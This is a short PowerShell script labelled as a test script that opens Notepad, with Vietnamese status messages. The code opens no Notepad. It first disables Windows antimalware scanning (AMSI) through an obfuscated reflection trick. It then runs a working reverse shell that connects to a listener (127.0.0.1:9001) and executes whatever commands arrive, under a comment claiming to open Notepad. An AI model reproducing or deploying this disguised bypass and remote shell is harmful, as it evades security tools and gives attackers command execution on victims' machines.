$y = [Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+$([char]109+$([char]115+$([char]105+$([char]85+$([char]116+$([char]105+$([char]108+$([char]115))))))))))
$y.GetField($([char]97+$([char]109+$([char]115+$([char]105+$([char]73+$([char]110+$([char]105+$([char]116+$([char]70+$([char]97+$([char]105+$([char]108+$([char]101+$([char]100)))))))))))))),'NonPublic,Static').SetValue($null,$true)# Test Notepad Script

Start-Sleep -Seconds 2
Write-Host "=== TEST SCRIPT NOTEPAD ===" -ForegroundColor Green
Write-Host "Script dang chay..." -ForegroundColor Yellow

# Mở Notepad
$LHOST = "127.0.0.1"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

